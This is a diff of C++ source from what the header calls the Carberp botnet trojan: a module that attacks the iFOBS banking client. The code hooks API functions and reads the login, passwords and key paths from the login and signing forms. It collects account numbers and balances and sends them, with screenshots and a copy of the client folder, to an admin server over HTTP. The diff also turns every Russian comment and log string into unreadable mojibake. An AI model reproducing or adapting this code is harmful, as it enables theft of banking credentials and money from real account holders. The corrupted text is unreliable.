@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "GetApi.h"
 #include "KeyLogSystems.h"
 #include "Memory.h"
@@ -30,13 +41,13 @@ const int PROCESS_HASH = 0x9FF6B644; // ifobsclient.exe
 const DWORD HashClassEditControl = 0x2ED8AE2E; // TcxCustomInnerTextEdit 
 const DWORD HashClassButtonControl = 0xA5AD5F9; // TcxButton
 const DWORD HashClassEditComboBox = 0x8EDA56FA; // TcxCustomComboBoxInnerEdit
-//хеш окна регистрации
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 const DWORD HashClassLoginForm = 0x918D725B; // TLoginForm.UnicodeClass
 const DWORD HashSignAsForm = 0x8225F3D9; // TSignAsForm.UnicodeClass
 
 const int MaxFindedControl = 6;
 
-int pluginInstalled = 0; //0 - плагин еще не грузили, 1 - плагин не установился, 2 - плагин успешно установлен
+int pluginInstalled = 0; //0 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 1 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 2 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 struct ForFindControl
 {
@@ -59,16 +70,16 @@ struct AccBalans
 	int set;
 };
 
-//объявления и определения необходимые для ifobs.plug
-struct HookFunc //функция на которую ставится хук
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ ifobs.plug
+struct HookFunc //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 {
-	char* nameDll; //имя длл в которой находится nameHookFunc
-	char* nameFunc; //имя функции на которую подменяем
-	DWORD hashOrigFunc; //хеш подменяемой функции
-	char* nameOrigFunc; //имя подменяемой функции (для ifobs.plug)
+	char* nameDll; //пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ nameHookFunc
+	char* nameFunc; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	DWORD hashOrigFunc; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	char* nameOrigFunc; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅ ifobs.plug)
 };
 
-//имена параметров в ини файле, для подмены
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct NameIniParam
 {
 	char* app;
@@ -96,22 +107,22 @@ static NameIniParam namesIni[] =
 	{ 0, 0 }
 };
 
-//прототип из ifobs.plug
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ ifobs.plug
 typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);
 
 
-char folderIFobs[MAX_PATH]; //папка в которой находится прога, для копирования на сервер
-char resultGrab[768]; //результат грабера для отсылки в админку и видео сервер
+char folderIFobs[MAX_PATH]; //пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+char resultGrab[768]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-//хеши кнопки Принять на разных языках, при нажатии такой кнопки грабятся данные 
-DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C797A7A /* Accept */, 
-					 0xBEA055E9 /* Підписати */, 0xBE1A55FD /* Подписать */, 0xA7A73EE /* Sign */, 0 };
-AccBalans dataFromPlug; //данные от ifobs.plug
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
+DWORD btAccept[] = { 0x8DBF3905 /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅ */, 0x62203A2E /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */, 0x3C797A7A /* Accept */, 
+					 0xBEA055E9 /* ПіпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */, 0xBE1A55FD /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */, 0xA7A73EE /* Sign */, 0 };
+AccBalans dataFromPlug; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ ifobs.plug
 
-//отсылка скриншотов формируемых плагином
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static DWORD WINAPI SendScreenshot(void*);
 
-int typeActive = 0; //с какоо окна грабим: 1 - регистрация, 2 - подписывание
+int typeActive = 0; //пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: 1 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 2 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 static char* GetAdminUrl( char* url )
 {
@@ -162,12 +173,12 @@ static void FreeFFC( ForFindControl& ffc )
 	for( int i = 0; i < ffc.count; i++ ) STR::Free(ffc.texts[i]);
 }
 
-//создает и возвращает рабочую папку для IFobs, в нее ложатся файлы необходимые для плагина
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ IFobs, пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static char* GetWorkFolder( char* path, const char* nameFile )
 {
 	pSHGetFolderPathA( 0, CSIDL_LOCAL_APPDATA,  0, 0, path );
 	pPathAppendA( path, "IFobs" );
-	pCreateDirectoryA( path, 0 ); //создает папку, если ее нет
+	pCreateDirectoryA( path, 0 ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ
 	pPathAppendA( path, nameFile );
 	return path;
 }
@@ -184,27 +195,27 @@ static DWORD WINAPI SendResultGrab(void*)
 		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=1&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
 		THTTP H;
 		H.Get(request.AsStr());
-		DBG( "IFobs", "Отослали запрос resultGrab: '%s'", request.AsStr() );
+		DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ resultGrab: '%s'", request.AsStr() );
 		STR::Free(urlText);
 	}
 	return 0;
 }
 
-//в окне регистрации 4-е текстовых поля ввода, путем перечисления всех дочерних окон находим эти контролы
-//в массиве texts структуры ForFindEditControl они находятся в следующем порядке: 0 - путь к ключам, 
-//1 - пароль для ключей, 2 - пароль для входа систему, 3 - логин
+//пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 4-пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ texts пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ForFindEditControl пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: 0 - пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, 
+//1 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, 2 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 3 - пїЅпїЅпїЅпїЅпїЅ
 static void GrabData( HWND wnd )
 {
-	DBG( "IFobs", "Грабим данные" );
+	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
 	ForFindControl ffc;
 	ClearStruct(ffc);
 	resultGrab[0] = 0;
-	if( typeActive == 1 ) //окно регистрации
+	if( typeActive == 1 ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		ffc.hash1 = HashClassEditControl;
 		ffc.hash2 = -1;
 	}
-	else //окно подписи
+	else //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		ffc.hash1 = HashClassEditControl;
 		ffc.hash2 = HashClassEditComboBox;
@@ -212,7 +223,7 @@ static void GrabData( HWND wnd )
 	pEnumChildWindows( wnd, EnumChildProc, &ffc );
 	fwsprintfA pwsprintfA = Get_wsprintfA();
 	char serverKeys[128];
-	if( typeActive == 1 ) //окно регистрации
+	if( typeActive == 1 ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		AddStrLog( "Login", ffc.texts[3] );
 		AddStrLog( "Password system", ffc.texts[2] );
@@ -246,7 +257,7 @@ static void GrabData( HWND wnd )
 //	KeyLogger::CloseSession();
 }
 
-//это кнопка Принять
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static bool IsBtAccept( HWND wnd, const char* text )
 {
 	char buf[64];
@@ -258,8 +269,8 @@ static bool IsBtAccept( HWND wnd, const char* text )
 
 	DWORD hash = STR::GetHash( (char*)text, 0, false );
 	int i = 0;
-	while( btAccept[i] && btAccept[i] != hash ) i++; //смотрим в массиве хешей
-	if( btAccept[i] ) //кнопка Принять
+	while( btAccept[i] && btAccept[i] != hash ) i++; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	if( btAccept[i] ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		return true;
 	return false;
 }
@@ -299,9 +310,9 @@ static HWND GetLoginForm( HWND wnd )
 		}
 	}
 	if( mainWnd )
-		DBG( "IFobs", "Нашли окно регистрации %08x", mainWnd );
+		DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %08x", mainWnd );
 	else
-		DBG( "IFobs", "Окно регистрации ненайдено" );
+		DBG( "IFobs", "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	return mainWnd;
 }
 
@@ -309,7 +320,7 @@ static void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 {
 	if( Msg->message == WM_LBUTTONUP )
 	{
-		//смотрим нажали ли на кнопку Принять
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if( IsBtAccept( Msg->hwnd, 0 ) )
 		{
 			HWND parent = (HWND)pGetParent(Msg->hwnd);
@@ -317,31 +328,31 @@ static void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 		}
 	}
 	else
-		if( Msg->message == WM_KEYUP && Msg->wParam == VK_RETURN ) //нажали клавишу Enter
+		if( Msg->message == WM_KEYUP && Msg->wParam == VK_RETURN ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Enter
 		{
-			DBG( "IFobs", "Нажали клавишу Enter" );
-			//ищем главное окно
+			DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Enter" );
+			//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			HWND mainWnd = GetLoginForm(Msg->hwnd);
 			
-			//ищем все кнопки на форме
+			//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			ForFindControl ffc;
 			ClearStruct(ffc);
 			ffc.hash1 = HashClassButtonControl;
 			ffc.hash2 = -1;
 			pEnumChildWindows( mainWnd, EnumChildProc, &ffc );
-			//ищем кнопку Принять
+			//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			for( int i = 0; i < ffc.count; i++ )
 				if( IsBtAccept( ffc.wnds[i], ffc.texts[i] ) )
 				{
-					//смотрим активна она или нет
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ
 					if( pIsWindowEnabled( ffc.wnds[i] ) )
 					{
-						DBG( "IFobs", "Кнопка Принять активна" );
+						DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 						GrabData(mainWnd);
 						break;
 					}
 					else
-						DBG( "IFobs", "Кнопка Принять заблокирована" );
+						DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 				}
 			FreeFFC(ffc);
 		}
@@ -354,7 +365,7 @@ static DWORD WINAPI SendBalans( LPVOID p )
 	TMemory text(768);
 	fwsprintfA pwsprintfA = Get_wsprintfA();
 	pwsprintfA( text.AsStr(), "DLL -> Login: '%s', Password system: '%s', Password keys: '%s', Path keys: %s, Client folder: %s", dataFromPlug.login, dataFromPlug.pwd1, dataFromPlug.pwd2, dataFromPlug.pathKeys, folderIFobs );
-	log.Send( 0, "Счет: '%s', баланс: '%s', банк: '%s'", dataFromPlug.accNumber, dataFromPlug.balans, dataFromPlug.nameBank );
+	log.Send( 0, "пїЅпїЅпїЅпїЅ: '%s', пїЅпїЅпїЅпїЅпїЅпїЅ: '%s', пїЅпїЅпїЅпїЅ: '%s'", dataFromPlug.accNumber, dataFromPlug.balans, dataFromPlug.nameBank );
 	log.Send2( 0, text.AsStr() );
 	if( GetAdminUrl(urlAdmin) )
 	{
@@ -367,15 +378,15 @@ static DWORD WINAPI SendBalans( LPVOID p )
 		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1&ida=%s", urlAdmin, BOT_UID, azUser.t_str(), dataFromPlug.balans, dataFromPlug.accNumber, urlBank, dataFromPlug.accId  );
 		THTTP H;
 		H.Get(request.AsStr());
-		DBG( "IFobs", "Отослали запрос 1: '%s'", request.AsStr() );
+		DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 1: '%s'", request.AsStr() );
 
 		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=00&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
 		H.Get(request.AsStr());
-		DBG( "IFobs", "Отослали запрос 2: '%s'", request.AsStr() );
+		DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 2: '%s'", request.AsStr() );
 
 //		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=1&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText2 );
 //		H.Get(request.AsStr());
-//		DBG( "IFobs", "Отослали запрос 3: '%s'", request.AsStr() );
+//		DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 3: '%s'", request.AsStr() );
 
 		STR::Free(urlBank);
 		STR::Free(urlText);
@@ -399,7 +410,7 @@ static void WINAPI PutBalans( const char* accNumber, const char* accId, const ch
 	m_lstrcpy( dataFromPlug.balans, balans );
 	m_lstrcpy( dataFromPlug.nameBank, nameBank );
 	dataFromPlug.set |= 1;
-	if( dataFromPlug.set == 3 ) //все поля заполнены
+	if( dataFromPlug.set == 3 ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		RunThread( SendBalans, 0 );
 }
 
@@ -411,7 +422,7 @@ static void WINAPI PutPasswords(const char* login, const char* pwd1, const char*
 	SafeCopyStr( dataFromPlug.pwd2, sizeof(dataFromPlug.pwd2), pwd2 );
 	SafeCopyStr( dataFromPlug.pathKeys, sizeof(dataFromPlug.pathKeys), pathKeys );
 	dataFromPlug.set |= 2;
-	if( dataFromPlug.set == 3 ) //все поля заполнены
+	if( dataFromPlug.set == 3 ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		RunThread( SendBalans, 0 );
 }
 
@@ -433,11 +444,11 @@ static BYTE* GetPlugin( const char* name, DWORD& size )
 static void DelPlugin( const char* name )
 {
 	string nameFile = BOT::MakeFileName( 0, name );
-	DBG( "IFobs", "Удаляем плагин %s -> %s", name, nameFile.t_str() );
+	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s -> %s", name, nameFile.t_str() );
 	pDeleteFileA(nameFile.t_str());
 }
 
-//удаляет загруженные плагины, чтобы они потом обновились
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void DeletePlugins()
 {
 	KillIFobs((void*)2);
@@ -448,30 +459,30 @@ void DeletePlugins()
 
 static DWORD WINAPI LoadPluginIFobs(LPVOID)
 {
-	DBG( "IFobs", "Загрузка ifobs.plug" );
+	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ifobs.plug" );
 	DWORD sizeIfobsPlug = 0;
 	BYTE* dataIFobsPlug = GetPlugin( "ifobs.plug", sizeIfobsPlug );
-	DBG( "IFobs", "Загрузка RtlExt.plug" );
+	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ RtlExt.plug" );
 	DWORD sizeRtlExt = 0;
 	BYTE* rtlExt = GetPlugin( "rtlext.plug", sizeRtlExt );
 	int res = 1;
 	if( dataIFobsPlug && rtlExt )
 	{
-		DBG( "IFobs", "Плагины загружены" );
+		DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		
-		//пишем в папку клиента RtlExt.bpl, она необходима для работы плагина
+		//пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ RtlExt.bpl, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		char pathExtRtl[MAX_PATH];
 		GetWorkFolder( pathExtRtl, "RtlExt.bpl" );
 		if( File::WriteBufferA( pathExtRtl, rtlExt, sizeRtlExt ) == sizeRtlExt )
 		{
-			DBG( "IFobs", "Создали %s", pathExtRtl );
+			DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", pathExtRtl );
 			res = 2;
 		}
 		else
-			DBG( "IFOBS", "Не удалось создать %s", pathExtRtl );
+			DBG( "IFOBS", "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", pathExtRtl );
 	}
 	else
-		DBG( "IFobs", "Не удалось загрузить плагины" );
+		DBG( "IFobs", "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	pluginInstalled = res;
 	MemFree(dataIFobsPlug);
 	MemFree(rtlExt);
@@ -495,7 +506,7 @@ static bool InitPlugin()
 	PInitFunc InitFunc = (PInitFunc)pGetProcAddress( ifobsPlug, "InitFunc" );
 	if( InitFunc )
 	{
-		DBG( "IFobs", "есть InitFunc" );
+		DBG( "IFobs", "пїЅпїЅпїЅпїЅ InitFunc" );
 
 		if ( InitFunc((DWORD)&PutBalans, "BalanceCallBack") )
 			DBG( "IFobs", "BalanceCallBack set ok.");
@@ -511,14 +522,14 @@ static bool InitPlugin()
 			void* plugFunc = (void*)pGetProcAddress( ifobsPlug, fp->nameFunc );
 			if( plugFunc )
 			{
-				DBG( "IFobs", "Найдена функция %s", fp->nameFunc );
+				DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", fp->nameFunc );
 				DWORD addrRealFunc;
 				if( HookApi( fp->nameDll, fp->hashOrigFunc, plugFunc, (PVOID*)&addrRealFunc ) )
 				{
-					DBG( "IFobs", "Установлен хук на %s", fp->nameOrigFunc );
+					DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ %s", fp->nameOrigFunc );
 					if( InitFunc(addrRealFunc, fp->nameOrigFunc) )
 					{
-						DBG( "IFobs", "InitFunc на %s", fp->nameOrigFunc );
+						DBG( "IFobs", "InitFunc пїЅпїЅ %s", fp->nameOrigFunc );
 						fp++;
 						continue;
 					}
@@ -530,29 +541,29 @@ static bool InitPlugin()
 		if( ok )
 		{
 			RunThread( SendScreenshot, 0 );
-			DBG( "IFobs", "ifobs.plug успешно установлен" );
+			DBG( "IFobs", "ifobs.plug пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 			ret = true;
 		}
 		else
-			DBG( "IFobs", "ifobs.plug не установлена" );
+			DBG( "IFobs", "ifobs.plug пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	}
 	//MemFree(dataIFobsPlug);
 	return ret;
 }
 
-//отсылка полного клиента на видео сервер
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD WINAPI SendIFobs(LPVOID)
 {
 	BOT::Initialize(ProcessUnknown);
-	DBG( "IFobs", "запуск отсылки программы на сервер из папки %s", folderIFobs );
+	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", folderIFobs );
 //	Bot->CreateFileA( 0, GetStr(IFobsFlagCopy).t_str() );
 //	DWORD folderSize = 0;
 //	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
 //	{
-//		DBG( "IFobs", "Папка программы больше заданного размера, не копируем" );
+//		DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 //		return 0;
 //	}
-//	DBG( "IFobs", "Размер папки %d байт", folderSize );
+//	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %d пїЅпїЅпїЅпїЅ", folderSize );
 	char tempFolder[MAX_PATH], clientPrg[MAX_PATH];
 	m_memcpy( clientPrg, "Client_prg\\", 11 );
 	PathToName( folderIFobs, clientPrg + 11, sizeof(clientPrg) - 11 );
@@ -562,24 +573,24 @@ DWORD WINAPI SendIFobs(LPVOID)
 	STR::Free(cryptName);
 	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
 	{
-		DBG( "IFobs", "Эта папка на данный момент выкачивается" );
+		DBG( "IFobs", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		return 0;
 	}
 	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
 	pCreateDirectoryA( tempFolder, 0 );
-	DBG( "IFobs", "Копирование во временную папку %s", tempFolder );
